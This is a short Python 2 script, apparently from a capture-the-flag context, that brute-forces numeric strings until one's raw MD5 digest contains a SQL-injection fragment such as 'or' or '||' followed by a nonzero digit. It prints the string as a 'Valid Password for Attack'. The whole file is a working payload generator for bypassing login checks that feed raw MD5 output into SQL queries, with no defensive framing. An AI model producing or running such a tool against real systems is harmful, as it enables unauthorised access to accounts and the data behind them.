from hashlib import md5
import os


def check_md5_str(md5_str):

    pos1 = md5_str.find("'||'")
    pos2 = md5_str.lower().find("'or'")

    if pos1 >= 0 and (pos1 + 4) < len(md5_str) and md5_str[pos1 + 4].isdigit():
        if int(md5_str[pos1 + 4]) > 0:
            print 'MD5 Digest :', md5_str
            return True

    if pos2 >= 0 and (pos2 + 4) < len(md5_str) and md5_str[pos2 + 4].isdigit():
        if int(md5_str[pos2 + 4]) > 0:
            print 'MD5 Digest :', md5_str
            return True

    return False


found = False

while not found:

    random_str = os.urandom(16).encode('hex')
    i = int(random_str, 16)
    print "New Random Password :", i

    while True:
        attack_str = str(i)
        md5_str = md5(attack_str).digest()

        #print 'MD5 Digest :', md5_str

        i = i + 1

        if (i % 100000000) == 0:
            break

        if check_md5_str(md5_str):
            found = True
            break

print "Valid Password for Attack :", attack_str
